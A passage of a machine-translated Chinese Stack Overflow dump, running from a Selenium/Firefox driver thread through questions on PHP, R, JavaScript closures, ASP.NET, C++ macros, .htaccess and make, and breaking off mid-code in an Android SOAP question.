关闭 Firefox 并确保 Firefox 可执行文件不再运行。然后试试你的测试。它现在应该可以工作了。

我猜这与您使用“重新启动以更新”时 Firefox 二进制文件的确切更新时间有关

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-04-01T13:13:14.813

我在 Firefox 36 上遇到了这个问题，人们在 35 和 44 也面临同样的问题。

总之，将您的 Firefox 升级到 37 或将其降级到 33 以下。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2015-11-25T21:31:42.453

`ios-server-0.6.5-jar-with-dependencies.jar`在与此作斗争并尝试了此处列出的大多数（如果不是全部）选项之后，我终于通过在我的构建路径中删除一个未使用的 JAR - 并使用`FF34`selenium jars的组合来摆脱这个错误`2.48.2`。

*只是想将此作为另一种选择发布，以防有​​人遇到这个令人衰弱的问题。*

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2016-12-17T13:25:40.607

```
my recommendation is 

    ===> switch to firefox version 50.0 [latest One] , 

    ===> download the gecko driver from [.](https://github.com/mozilla/geckodriver/releases)  and 

    ===> Selenium version 3.0.1
     <dependency>
                <groupId>org.seleniumhq.selenium</groupId>
                <artifactId>selenium-java</artifactId>
                <version>3.0.1</version>
     </dependency>

    ==> On your Code 
private WebDriver driver;
System.setProperty("webdriver.gecko.driver", "PATH to GECKO DRIVER");
        driver = new FirefoxDriver();

    and yes you see the below output in your console :

    Dec 17, 2016 6:40:45 PM org.openqa.selenium.remote.ProtocolHandshake createSession
    INFO: Attempting bi-dialect session, assuming Postel's Law holds true on the remote end
    14819XXXXXXX5   mozprofile::profile INFO    Using profile path C:\Users\User\AppData\Local\XXXXX\rust_XXXprofile.OXXXXXXXXXXX7S
    148XXXXXXXXX0   geckodriver::marionette INFO    Starting browser C:\Program Files\Mozilla Firefox\firefox.exe
    148XXXXXXXXX1   geckodriver::marionette INFO    Connecting to Marionette on localhost:XXXXXXX
    148198XXXX077   Marionette  INFO    Listening on port 53532
    Dec 17, 2016 6:40:55 PM org.openqa.selenium.remote.ProtocolHandshake createSession
    INFO: Detected dialect: W3C
    [Child 4104] ###!!! ABORT: Aborting on channel error.: file c:/builds/moz2_slave/m-rel-w32-00000000000000000000/build/src/ipc/glue/MessageChannel.cpp, line XXXX
    Dec 17, 2016 6:41:13 PM org.openqa.selenium.os.UnixProcess destroy 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2019-08-11T07:28:39.110

尝试使用最新的 selenium 服务器版本，您需要检查浏览器和 selenium 服务器之间的兼容性。

```
 <dependency>
    <groupId>org.seleniumhq.selenium</groupId>
    <artifactId>selenium-java</artifactId>
    <version>3.141.59</version>
    </dependency> 
```

* * *

## 回答 #10

> 赞同：-1
> 
> 时间：2015-08-24T09:52:18.510

找不到 firefoxbinary 路径。请在使用 firefox 驱动程序之前设置 firefox 路径。

```
System.setProperty("webdriver.firefox.bin", "C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe"); 
```

* * *

## 回答 #11

> 赞同：-2
> 
> 时间：2014-10-06T08:34:40.757

当 Firefox 缓存文件夹所在的磁盘上没有剩余空间时，也会出现同样的问题。只需释放空间并启动您的脚本！

# php - 是否可以通过 PHP 获取 HTML 元素的属性

> ID：13514342
> 
> 赞同：-1
> 
> 时间：2012-11-22T14:01:11.087
> 
> 标签：php

我知道通过使用 jQuery，我可以`$('span').attr('title')`用来获取属性标题的值，但是我如何使用 PHP 来做到这一点？

前

`<span title="2012-11-22 15:35">6 小時前&lt;/span>`

后

`<span>22/11/2012 15:35</span>`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:10:07.227

您可以将其加载到 DOM 文档中，或使用 simplexml。

DOM 文档示例：

```
// Load your HTML as a string here, or you can open a file (see docs)
$myHtml = new \DOMDocument();
$myHtml->loadHTML($htmlString);

// Get all span tags
$spans = $myHtml->getElementsByTagName('span');

foreach ($spans as $span) {
    // get
    $span->getAttribute('title');

    // set  
    $span->setAttribute('title', 'new title');

    // append text node (like innerHTML)
    $span->appendChild($myHtml->createTextNode('something'));
} 
```

要替换元素的文本，您需要创建一个 TextNode 并附加到 span。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:09:18.297

可以使用带有[xpath的](http://php.net/manual/en/simplexmlelement.xpath.php)[DOM](http://php.net/manual/en/book.dom.php)来解析 HTML 。Xpath 可用于选择属性提供的 html 中的任何元素。

# block - 在群聊中通知邀请者关于数据包拒绝

> ID：13514350
> 
> 赞同：1
> 
> 时间：2012-11-22T14:01:32.540
> 
> 标签：block, openfire, invitation

我开发了一个 openfire 插件（Openfire 版本是 3.6.4）来监控用户之间的数据包流，如果管理员这样做，它可以限制 2 个用户聊天，如果有 2 个用户，它在对等聊天中工作正常user1 & user2，管理员希望 user1 不应该与 user2 进行对等聊天，在这种情况下它工作正常，如果 user1 尝试与 user2 聊天，他会收到一条消息“不允许”（自定义消息）（我在代码中抛出数据包拒绝异常以通知发件人）。

现在管理员希望用户 1 不应该与用户 2 开始群聊（用户 2 没有收到聊天室邀请），但邀请者没有收到任何回复说“不允许”（如对等聊天中的情况），所以任何人都可以建议我我该怎么做通过向邀请人发送消息通知他。

我已经在 xmpp RFC 0045 (http://xmpp.org/extensions/xep-0045.html#ban) 中检查了群聊的管理员用例，它有管理员用例来禁止用户群聊，谁能建议我如何使用这个 RFC 数据包通知邀请者。

# r - 如何避免 0 频率的电平下降

> ID：13514353
> 
> 赞同：1
> 
> 时间：2012-11-22T14:01:41.957
> 
> 标签：r

我正在尝试比较两个问题（列`Q1_b`和`Q2_b`）并将它们彼此相邻（在同一个条形图中），答案选项是 1-6。问题是没有人回答 4 for `Q1_b`，所以条形图跳到显示 5 应该是 4 的地方`Q1_b`，旁边是回答 4 for 的人的百分比`Q2_b`。如果没有针对特定选项的任何答案，我如何确保 R 不执行此操作并自动输入 0% 列？

```
alldataset<-structure(list(Q1_b = c(6L, 1L, 5L, 3L, 5L, 6L, 6L, 2L), 
                           Q2_b = c(1L, 2L, 2L, 5L, 4L, 3L, 6L, 1L)), 
                      .Names = c("Q1_b", "Q2_b"), 
                      class = "data.frame", 
                      row.names = c(NA, -8L))

Qb<-table(alldataset$Q2_b)
Qf<-table(alldataset$Q1_b)

nrowFUP<-NROW(alldataset$Q1_b)
nrowBL<-NROW(alldataset$Q2_b)

options(digits=6)
newbl <- transform(as.data.frame(table(alldataset$Q2_b)),    
                 percentage_column=Freq/nrowBL*100)

newfup <- transform(as.data.frame(table(alldataset$Q1_b)), 
                    percentage_column=Freq/nrowFUP*100)

matrixQ1<-cbind(newbl$percentage_column, newfup$percentage_column)

matrixQ1dataframe<-data.frame(matrixQ1)
rmatrixQ1<-as.vector(t(matrixQ1dataframe))
roundedrmatrix<-round(rmatrixQ1, digits=0)
barplotmatrix<-matrix(roundedrmatrix)

par(mar=c(7.5,4,3,2), mgp=c(2,.7,0), tck=-.01, las=1, xpd=TRUE)

 b<-barplot(matrix(roundedrmatrix, nr=2), 
           beside=T, xlab="",
           ylab="Percentage",
           cex.lab=0.9, 
           main="Comparison",
           cex.main=0.9, ylim=c(0,70), 
           col=c("black","yellow"), 
           names.arg=c(1:6),
           legend=c("Q2_b","Q1_b"),
           args.legend=list(x="bottomleft", 
                            cex=0.8,
                            inset=c(0.4,-0.4)))
text(x=b, y=roundedrmatrix,labels=roundedrmatrix, pos=3, cex=0.8) 
```

R 还通过显示以下内容警告我这将发生：

```
Warning message:
In cbind(newbl$percentage_column, newfup$percentage_column) :
  number of rows of result is not a multiple of vector length (arg 2) 
```

我已经尝试了很长时间来解决这个问题，但我没有得到任何结果。任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-22T14:31:47.517

问题是您从未告诉 R 您的向量代表潜在值为 1-6 的分类响应，因此它不知道包含 0 计数（您不希望它包含 7、8、1 百万的 0， ETC。）。

尝试将您的第一 2 行替换为：

```
Qb<-table(factor(alldataset$Q2_b, levels=1:6))
Qf<-table(factor(alldataset$Q1_b, levels=1:6)) 
```

或运行类似的东西：

```
alldataset$Q1_b <- factor(alldataset$Q1_b, levels=1:6)
alldataset$Q2_b <- factor(alldataset$Q2_b, levels=1:6) 
```

在表命令之前。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-22T14:34:15.020

您需要告诉`table`使用 1 到 6 的所有值`table(factor(x, seq.int(6)))`。

这是您的代码的改进版本：

```
dat <- t(round(sapply(rev(alldataset),
                      function(x) table(factor(x, seq.int(6)))) / 
                                                         nrow(alldataset) * 100))

par(mar=c(7.5,4,3,2), mgp=c(2,.7,0), tck=-.01, las=1, xpd=TRUE)
b <- barplot(dat, beside=T,xlab="", ylab="Percentage", cex.lab=0.9, 
             main="Comparison", cex.main=0.9, ylim=c(0,70), 
             col=c("black","yellow"), names.arg=c(1:6), legend=names(dat), 
             args.legend=list(x="bottomleft", cex=0.8, inset=c(0.4,-0.4)))
text(x=b, y=dat,labels=dat, pos=3, cex=0.8) 
```

![在此处输入图像描述](../Images/f682b0371c6d9e2748d278b4ff3e87fe.png)

# ajax - 对 Picasa API 的 POST 请求

> ID：13514355
> 
> 赞同：1
> 
> 时间：2012-11-22T14:01:52.710
> 
> 标签：ajax, api, picasa

我一直在为 Picasa API 上的 POST 苦苦挣扎。这是代码：

```
$.ajax({
    type: "POST",               
    url: 'https://picasaweb.google.com/data/feed/api/user/' + uid + '/albumid/' + album_id + '/photoid/' + photo_id,
    crossDomain: true,
    data: { content: content },
    success: function() { alert("Success"); },
    error: function() { alert('Failed!'); }
}); 
```

我已经通过 GET 毫无问题地检索了一些信息。

现在有趣的部分来了，当我尝试使用 Google 测试服务时，会出现此错误：

```
 XMLHttpRequest cannot load
 https://picasaweb.google.com/data/feed/api/user/userid/albumid/albumid/photoid/photoid?content=foo%bar.
 Origin http://localhost:3000 is not allowed by
 Access-Control-Allow-Origin 
```

.

当我在 Firefox 中尝试时，请求标头方法更改为`OPTIONS`，状态为`204: no content`.
此外，我尝试更改`datatype`为，`jsonp`但随后 HTTP 方法更改为`GET`并检索有关图片的信息。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T05:22:51.637

`Access-Control-Allow-Origin`即将到来，因为您正在对与您当前域不同的服务器进行 ajax 调用。[在这里](http://en.wikipedia.org/wiki/Same_origin_policy)阅读更多

`jsonp`对请求没有帮助，`POST`因为您只能`GET`使用`jsonp`.

恕我直言，您应该尝试从服务器端而不是客户端脚本发出 POST 请求。

# javascript - LinkedIn JS API - 无法通过 JS 获取教育对象

> ID：13514356
> 
> 赞同：4
> 
> 时间：2012-11-22T14:01:58.467
> 
> 标签：javascript, linkedin

我对 LinkedIn JS API 有疑问。当我运行应用程序并且我**可以**访问：

```
IN.API.Connections("me")
    .fields("id", "firstName", "lastName", "pictureUrl", "publicProfileUrl")
    .result(function(result, metadata) {
      console.log(result);
    }); 
```

但是当我尝试获得教育、语言或其他收藏时，我**无法获得它**。

以下代码为我返回一个空对象：

```
IN.API.Connections("me")
    .fields("educations")
    .result(function(result, metadata) {
      console.log(result);
    }); 
```

我什么都试过了。请给我一些帮助。

附言。当我使用[apigee.com](https://apigee.com/console/linkedin)或[JavaScript API 开发人员控制台](http://developer.linkedinlabs.com/jsapi-console/)时，没有问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-12-03T00:45:37.433

由于您正在尝试获取有关您的连接的信息，因此您只能获得 1 度连接的基本配置文件字段。

以下是配置文件字段列表：[https](https://developer.linkedin.com/documents/profile-fields#profile) ://developer.linkedin.com/documents/profile-fields#profile 。教育不是基本的个人资料字段之一。

# javascript - Javascript中的while循环与连接

> ID：13514360
> 
> 赞同：0
> 
> 时间：2012-11-22T14:02:10.010
> 
> 标签：javascript, while-loop

我正在尝试`while`在我的 Javascript 中创建一个循环。

到目前为止，我有这个：

```
<script>
    $(document).ready(function(){       
        var i=0;
        while (i<9999) {
            $(".add_new_item_field" + i).hide();    
        $(".add_new_item_button" + i).click(function(){
            $(".add_new_item_field" + i).slideToggle("slow");
        });
        i++;
        }
    });
</script> 
```

目标是使这项工作：

```
<div class="add_new_item_button1"></div>
<div class="add_new_item_button2"></div>
<div class="add_new_item_button3"></div>
...
<div class="add_new_item_field1">Show me something</div>
<div class="add_new_item_field2">Show me something</div>
<div class="add_new_item_field3">Show me something</div>
... 
```

但由于某种原因，它不起作用。我在这里错过了什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:07:50.473

我猜这`i`不是您期望它在处理程序中的样子，因为当处理程序执行时`i`已经达到了 9999 的最大值。要解决这个问题，您需要将变量带入处理程序闭包，例如：

```
var i=0;
while (i<9999) {
    $(".add_new_item_field" + i).hide();  
    $(".add_new_item_button" + i).click((function(i) {
        // i is now saved in this closure
        return function() {
            $(".add_new_item_field" + i).slideToggle("slow");
        };
    }(i)));
    i++;
} 
```

旁注：我不太确定这是在这里解决您的*实际*任务的最佳方法，但循环和附加 9999 事件处理程序似乎没有必要......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-22T14:08:45.197

您的问题是`$(".add_new_item_field" + i).slideToggle("slow");`当您单击其中一个 div 时会发生该行中的连接。然而，设置处理程序的循环是很久以前运行的，并且`i`已经具有`9999`. 使用@David 演示的闭包来避免这种情况。

但是，我觉得这是错误的做法。设置 10000 个点击处理程序并执行 20000 个 jQuery 选择确实会使您的页面非常非常慢。对按钮使用一个公共类，对字段使用一个公共类。如果您不能依赖特定的文档顺序，请给它们唯一的 id 以相互引用 - 但不是类。

然后用一行 CSS 隐藏所有字段，并使用按钮的[事件委托](http://api.jquery.com/on/#direct-and-delegated-events)来触发 1 个函数，该函数通过 id 从附加到单击按钮的数据中查找字段。

```
<style>
    .add_new_item_field { display:none; }
</style>
<!-- placing the stylesheet here also avoids flickering.
Even better would be of course if it was written dynamically by JS, for not 
hiding the fields in clients that do not support JavaScript -->
<script src=/"jquery.js"></script>
<script>
jQuery(function($) {
    $(document).on("click", ".add_new_item_button", function(e) {
        var id = "field"+$(this).data("field");
        $('#'+id).show();
    });
});
</script>
<div class="add_new_item_button" data-field="1"></div>
<div class="add_new_item_button" data-field="2"></div>
<div class="add_new_item_button" data-field="3"></div>
...
<div class="add_new_item_field" id="field1">Show me something</div>
<div class="add_new_item_field" id="field2">Show me something</div>
<div class="add_new_item_field" id="field3">Show me something</div>
... 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-22T14:13:40.830

我认为您以错误的方式使用课程。您可以将单击处理程序分配给同一类的所有对象。但是您正在尝试将类说明符用作 ID，并尝试将处理程序分配给每个单独的对象。您不会对链接/网址的行为和布局做同样的事情吗？（链接）你会吗？

阅读：[jQuery：如何向类添加单击处理程序并找出单击了哪个元素？](https://stackoverflow.com/questions/1915007/jquery-how-do-i-add-a-click-handler-to-a-class-and-find-out-which-element-was-c)

您想为一个类设置处理程序，将您的 div 指定为该类。我没有滥用类说明符作为某种 ID。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-11-22T14:14:20.203

您正在单击处理程序中创建一个闭包，该闭包捕获 i 变量，而不是它的值。这意味着所有点击函数都将包含值 9999，它是 while 循环结束时变量的值。

您可以通过创建一个设置为单击处理程序的函数来修复它。

```
var setClick = function(index) {
   $(".add_new_item_button" + index).click(function(){
   $(".add_new_item_field" + index).slideToggle("slow");
   }
} 
```

并在您的 while 循环中使用它。

```
while (i<9999) {
    $(".add_new_item_field" + i).hide();    
    setClick(i);
    i++;
    } 
```

现在 i 的值被您的点击处理程序正确捕获

# python - 在程序子进程中加载 另一个接收文本文件的程序

> ID：13514362
> 
> 赞同：0
> 
> 时间：2012-11-22T14:02:16.900
> 
> 标签：python, user-interface, wxpython, subprocess

我想将另一个程序加载到我的 python GUI 中。另一个程序接收一个文本文件并打印出一个结果我想在我的另一个程序中打印出结果我只是想知道如何使用 subprocess 模块来解决这个问题

这是正确的做法吗？

```
def test(self,event):
    t=subprocess.check_output("filename test.py", shell=True)
    wx.StaticText(self,-1,t, (10,35)) 
```

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:47:54.050

使用子进程获取命令输出的方法是[check_output 函数](http://docs.python.org/2/library/subprocess.html#subprocess.check_output%20check_output)：

```
cmd = 'ping 192.168.1.1'
output = subprocess.check_output(cmd.split()) 
```

# asp.net - MembershipUserCollection 有一些无效的参数

> ID：13514364
> 
> 赞同：0
> 
> 时间：2012-11-22T14:02:24.173
> 
> 标签：asp.net, asp.net-mvc, exception, asp.net-mvc-4, asp.net-membership

这段代码

```
 @Html.TextBoxFor(m => m.UserName, new { @class = "validate[required]", disabled = "disabled", value = ViewBag.user[0].UserName }) @Html.ValidationMessage("usernameVal", "*") 
```

当它到达时抛出异常`ViewBag.user[0].UserName`

例外：

'System.Web.Security.MembershipUserCollection.this[string]' 的最佳重载方法匹配有一些无效参数

行动：

```
 public ActionResult EditUser()
    {

        //Resgata username do registro
        string user = Request.QueryString["username"];

        try 
        {   //Se nome foi resgatado
                String.IsNullOrEmpty(user)

                MembershipUserCollection muc = Membership.FindUsersByName(user);
                ViewBag.user = muc;

            return PartialView();

        }
        catch (Exception e)
        {

            return Content("Erro: " + e);

        }

    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:09:33.027

在您看来，您正在使用整数索引访问集合

```
ViewBag.user[0] 
```

正如异常所述，要访问 MembershipUserCollection 您需要提供一个字符串参数。

请参阅文档 - [http://msdn.microsoft.com/en-us/library/system.web.security.membershipusercollection.item.aspx](http://msdn.microsoft.com/en-us/library/system.web.security.membershipusercollection.item.aspx)

*获取指定用户名引用的集合中的成员资格用户。*

无需从 Controller 方法返回集合，只需返回单个 MembershipUser 对象

**在您的控制器中：**

```
 MembershipUser membershipUser = Membership.GetUser(user, false);
        ViewBag.user = membershipUser; 
```

**在您看来：**

将 value = ViewBag.user[0].UserName 替换为 value = ViewBag.user.UserName

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:14:11.217

该错误表明该集合需要[一个字符串键](http://msdn.microsoft.com/en-us/library/system.web.security.membershipusercollection.item.aspx)来访问非索引的元素。

你可以试试这个

```
ViewBag.user.ElementAt(0).UserName 
```

或者，如果您希望页面上有一个用户对象，则设置`ViewBag.User`为该用户对象并避免在位置 0 查找用户

# windows - Windows IPC：我可以通过匿名管道发送二进制数据吗？

> ID：13514366
> 
> 赞同：0
> 
> 时间：2012-11-22T14:02:32.713
> 
> 标签：windows, ipc, pipe, binary-data

我需要将数据从子进程发送到父进程。其中一些数据是 HTML、纯文本等，但也可能需要发送图像数据、zip 文件数据等。

据我了解，匿名管道使用子进程标准输入和标准输出。通常标准输入和标准输出只传送文本数据：使用这种机制发送不可打印字符会有什么问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T20:52:38.357

匿名管道和标准输入/输出之间没有关系。由于一个进程只有一个标准输入/输出，因此您可以这样为每个进程创建一个匿名管道，这听起来很愚蠢，不是吗？您可以将子进程的标准输入/输出*重定向*到管道，是的。但是，如果子进程能够通过其他方式（如日志文件或网络活动）报告自己，则您不必这样做。调用 to[`CreatePipe`](http://msdn.microsoft.com/en-us/library/windows/desktop/aa365152%28v=vs.85%29.aspx)为您提供读取和写入句柄，这取决于您如何使用它们。确实可以发送任意二进制数据。在这方面，匿名管道与命名管道没有任何不同。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T21:15:24.040

即使您确实选择使用标准输入/标准输出重定向将管道句柄传递给子进程，只要子进程使用 Windows API 而不是 C 运行时库函数发送数据，您应该不会有任何问题.

也就是说，[`WriteFile`](http://msdn.microsoft.com/en-us/library/windows/desktop/aa365747%28v=vs.85%29.aspx)将完美地工作，但[`printf`](http://msdn.microsoft.com/en-us/library/wc7014hz%28v=vs.100%29.aspx)不是一个好主意。

您可以使用[`GetStdHandle`](http://msdn.microsoft.com/en-us/library/windows/desktop/ms683231%28v=vs.85%29.aspx)来获取管道的句柄，以便与 Windows API 函数一起使用。

# haskell - 在win7 64位上安装vacuum-cairo

> ID：13514370
> 
> 赞同：1
> 
> 时间：2012-11-22T14:02:51.667
> 
> 标签：haskell, cabal, cairo, vacuum

我对 Haskell 比较陌生，以前从未安装过软件包，我不知道如何解决这个问题。所以这就是我所做的： - 我安装了 Haskell 平台 - 我试图运行“cabal install Vacuum-cairo”

这就是我得到的（最后几行似乎很重要）：

```
setup.exe: The program pkg-config version >=0.9.0 is required but it could not
be found.
cabal: Error: some packages failed to install:
cairo-0.12.4 failed during the configure step. The exception was:
ExitFailure 1
gio-0.12.4 depends on glib-0.12.4 which failed to install.
glib-0.12.4 failed during the configure step. The exception was:
ExitFailure 1
gtk-0.12.4 depends on glib-0.12.4 which failed to install.
pango-0.12.4 depends on glib-0.12.4 which failed to install.
svgcairo-0.12.1.1 depends on glib-0.12.4 which failed to install.
vacuum-cairo-0.5 depends on glib-0.12.4 which failed to install. 
```

我也尝试了一些我在互联网上阅读的东西，但没有任何效果，我真的没有找到那么多。有人可以帮我解决这个问题吗？我真的很想使用那个包来更好地了解我在 Haskell 中所做的事情:)

# c++ - #define 在模式后使用两个标记

> ID：13514372
> 
> 赞同：4
> 
> 时间：2012-11-22T14:02:59.837
> 
> 标签：c++, macros, c-preprocessor

谷歌上的每一个参考都只显示了简单的例子，我在代码上有这个案例：

`#define XHANDLER(A,B,H) X_TO_BUS_HANDLER(A,B,H) X_FROM_BUS_HANDLER(A,B,H)`

```
namespace{
   X_TO_BUS_HANDLER( some::SomeClassX,
                     bus::SomeBus,
                     foo::SomeHandler ); 
```

有谁知道这个定义是如何工作的？一个模式和两个令牌列表？请参考。

我 egrepED 了代码，但只发现 X_TO_BUS_HANDLER 被使用了。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-22T14:05:42.690

它像任何其他定义一样工作 - 每当预处理器遇到 时`XHANDLER`，它都会用`X_TO_BUS_HANDLER(A,B,H) X_FROM_BUS_HANDLER(A,B,H)`（和参数）替换它。

在您的代码段中，未使用宏。

但是像

```
XHANDLER(some::SomeClassX, bus::SomeBus, foo::SomeHandler) 
```

相当于

```
X_TO_BUS_HANDLER(some::SomeClassX, bus::SomeBus, foo::SomeHandler) X_FROM_BUS_HANDLER(some::SomeClassX, bus::SomeBus, foo::SomeHandler) 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-22T14:05:45.487

请记住，预处理器只是用它们的主体替换宏。所以宏的使用

```
XHANDLER(a, b, c) 
```

只是被文本替换

```
X_TO_BUS_HANDLER(a, b, c) X_FROM_BUS_HANDLER(a, b, c) 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-22T14:18:14.073

C/C++ 预处理器将替换在同一行中编写的所有内容的模式。在您的情况下，看起来该模式之后的两个标记本身就是宏，因此它们也会被扩展。

一些例子：

```
#define F(x, y) x f(y yParam);
#define G(x, y) y g(x xParam);
#define FG(x, y) F(x, y) G(x, y);

FG(int, double)

//this is the same as:
int f(double yParam);
double g(int xParam); 
```

在您的情况下，我猜这两个定义 X_FROM_... 和 X_TO_... 创建了一些函数或类，它们分别是用于将 X 从或传递到某个总线的处理程序。XHANDLER 宏将为*两个*方向创建处理程序。

# php - 想要将 .php 文件显示为没有扩展名？

> ID：13514373
> 
> 赞同：0
> 
> 时间：2012-11-22T14:03:02.423
> 
> 标签：php, apache

我的网址是：http://www.example.com/home.php 我想在最终用户以[http://www.example.com/home](http://www.example.com/home)浏览我的网站时显示它。我知道这可以通过 .htaccess 文件来完成。

```
Following is the htacces file:
RewriteEngine On
RewriteBase /
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME}.php -f
RewriteRule ^(.+)$ $1.php 
```

.htaccess 文件中的上述代码没有发生任何事情。我想显示没有 .php 扩展名的整个网站页面。谁能建议我如何做到这一点

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:12:45.617

试试这个

```
<IfModule mod_rewrite.c>
  RewriteEngine on
  RewriteCond %{REQUEST_FILENAME} !-d
  RewriteCond %{REQUEST_FILENAME}\.php -f
  RewriteRule ^(.*)$ $1.php
</IfModule> 
```

# unit-testing - 生产中的茉莉花

> ID：13514379
> 
> 赞同：2
> 
> 时间：2012-11-22T14:03:43.363
> 
> 标签：unit-testing, testing, tdd, nunit, bdd

现在有人在生产项目中使用 NJasmine 吗？我喜欢一个更简单的 TDD 解决方案的想法，比如“开发人员级别的 TDD”。NJasmine 看起来很棒，但也很年轻。有人在 Prod 中使用它吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-01-05T09:23:26.407

它实际上并不算太糟糕，因为它取决于修改后的著名 NUnit Runner 带来的好处。我的测试代码更干净。（注：要测试的代码单元是一个场景）

# shell - 使用 sh 的 GNU make 命令行变量不起作用

> ID：13514381
> 
> 赞同：0
> 
> 时间：2012-11-22T14:03:52.003
> 
> 标签：shell, makefile, gnu-make

作品：

```
make -f Makefile.custom CFLAGS="-DFLAG_ONE -DFLAG_TWO" clean target 
```

什么不起作用是

```
FLAGS="-DFLAG_ONE -DFLAG_TWO"
make -f Makefile.custom CFLAGS=$FLAGS clean target 
```

错误：它开始认为 -D 是 make 的参数，但失败了。

尝试：使用转义字符

```
FLAGS="\"-DFLAG_ONE -DFLAG_TWO\"" 
```

任何帮助，将不胜感激。

- 更新 -

这是一种解决方法，但问题仍然悬而未决。

```
CFLAGS="-DFLAG_ONE -DFLAG_TWO"
export CFLAGS
make -f Makefile.custom clean target 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T15:27:20.793

引用是必要的：

```
FLAGS="-DFLAG_ONE -DFLAG_TWO"
make -f Makefile.custom CFLAGS="$FLAGS" clean target 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-22T14:08:00.687

```
CFLAGS="-DFLAG_ONE -DFLAG_TWO" make -f Makefile.custom clean target 
```

和简单的Makefile：

```
all:
        echo ${CFLAGS} 
```

...将打印：

```
-DFLAG_ONE -DFLAG_TWO 
```

...因此它确实有效。

# android - 将数据从 Android 发送到 Web 服务（通过 SOAP）

> ID：13514384
> 
> 赞同：0
> 
> 时间：2012-11-22T14:03:58.650
> 
> 标签：android, soap, web

我有一个 Web 服务，它需要一个 SOAP 请求来对 String 执行一个简单的方法。现在我在 Android 上编写了应用程序来使用这个 Web 服务，我希望它序列化一些数据并通过 SOAP 将其发送到 Web 服务。

这是一些代码：

```
public class SendedLocation implements Serializable {
    public String MESSAGE;

    public SendedLocation() {
    }

    public SendedLocation(int mId, float mLongitude, float mLatitude) {

        MESSAGE = String.valueOf(mId) + ";" + String.valueOf(mLongitude) + ";" +  String.valueOf(mLatitude);
    }

    public Object getProperty(int arg0) {

        switch (arg0) {
        case 0:
            return MESSAGE;
        }

        return null;
    }

    public int getPropertyCount() {
        return 1;
    }

    public void getPropertyInfo(int index, Hashtable arg1, PropertyInfo info) {
        switch (index) {
        case 0:
            info.type = PropertyInfo.STRING_CLASS;
            info.name = "MESSAGE";
            break;
        default:
            break;
        }
    }

    public void setProperty(int index, Object value) {
        switch (index) {
        case 0:
            MESSAGE = value.toString();
            break;
        default:
            break;
        }
    }

}

public void callWebService(int ID, float Longitude, float Latitude) {
    try {
        SoapObject request = new SoapObject(NAMESPACE, METHOD_NAME);
        AndroidHttpTransport androidHttpTransport = new AndroidHttpTransport(
                URL);

        SendedLocation mSended = new SendedLocation(ID, Longitude, Latitude);

        PropertyInfo p1 = new PropertyInfo();
        p1.setName("mSended");
        p1.setValue(mSended);
        p1.setType(mSended.getClass());
        request.addProperty(p1);

        SoapSerializationEnvelope envelope = new SoapSerializationEnvelope(
                SoapEnvelope.VER11);

        envelope.dotNet = true;
        envelope.setOutputSoapObject(request);

        envelope.addMapping(NAMESPACE, "mSended", mSended.getClass());

        MarshalString marshalString = new MarshalString();

        marshalString.register(envelope);

        // Make the soap call.
        androidHttpTransport.call(SOAP_ACTION, envelope);

        Object results = (Object) envelope.getResponse();
        // to get the data String
        // resultData=result.getProperty(0).toString();
        String temp = results.toString();
        System.out.println(temp);
    } catch (Exception aE) {
        System.out.println(aE.toString());
    }
}
public class MarshalString implements Marshal 
{

    public Object readInstance(XmlPullParser parser, String namespace, String name, 
            PropertyInfo expected) throws IOException, XmlPullParserException {

        return String.valueOf(parser.nextText());
    }

    public void register(SoapSerializationEnvelope cm) {
         cm.addMapping(cm.xsd, "string", String.class, this);

    }

    public void writeInstance(XmlSerializer writer, Object obj) throws IOException {
           writer.text(obj.toString());
        }

} 
```

我在 onCreate() 中调用这个 callWebService() 方法，如下所示：

```
callWebService(ID , (float)location.getLongitude() , (float)location.getLatitude()); 
```

然后，当我运行我的应用程序时，它会从 gps 获得修复，但在发送数据时执行 Web 服务它给了我：

```
java.lang.RuntimeException: Cannot serialize... 
```

有人可以向我解释我应该添加什么以使其正常工作吗？我真的不知道，在尝试使用元帅类的线索之后......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T04:47:51.233

尝试使用 SOAP Envelope 发送数据，SOAP Envelope 的语法：

```
final String envelope = "<?xml version=\"1.0\" encoding=\"utf-8\"?>"+
                      "<SOAP-ENV:Envelope SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\" " +
                      "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" " +
                      "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" " +
                      "xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"" +
                      " xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" " +
                      "xmlns:tns=\"urn:registerwsdl\">"+
                      "<SOAP-ENV:Body>"+
                      "<tns:register " +
